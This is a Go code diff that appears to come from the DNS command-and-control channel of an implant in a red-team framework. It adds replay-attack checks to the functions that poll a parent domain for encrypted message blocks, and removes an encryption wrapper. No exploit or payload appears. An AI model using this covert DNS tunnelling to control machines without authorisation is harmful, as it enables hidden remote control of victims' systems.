@@ -334,6 +334,9 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			log.Printf("Poll returned new block(s): %#v", txt)
 
 			rawTxt, _ := base64.RawStdEncoding.DecodeString(txt)
+			if isReplayAttack(rawTxt) {
+				break
+			}
 			pollData, err := GCMDecrypt(sessionKey, rawTxt)
 			if err != nil {
 				// {{if .Debug}}
@@ -365,7 +368,7 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 // Poll returned the server has a message for us, fetch the entire envelope
 func getSessionEnvelope(parentDomain string, sessionKey AESKey, blockPtr *pb.DNSBlockHeader) *pb.Envelope {
 	blockData, err := getBlock(parentDomain, blockPtr.Id, fmt.Sprintf("%d", blockPtr.Size))
-	if err != nil {
+	if err != nil || isReplayAttack(blockData) {
 		// {{if .Debug}}
 		log.Printf("Failed to fetch block with id = %s", blockPtr.Id)
 		// {{end}}
@@ -504,12 +507,6 @@ func dnsNonce(size int) string {
 		nonce = append(nonce, dnsCharSet[index])
 	}
 	return string(nonce)
-}
-
-// Wrapper around GCMEncrypt & Base32 encode
-func sessionEncrypt(sessionKey AESKey, data []byte) string {
-	encryptedData, _ := GCMEncrypt(sessionKey, data)
-	return dnsEncodeToString(encryptedData)
 }
 
 func fingerprintSHA256(block *pem.Block) string {
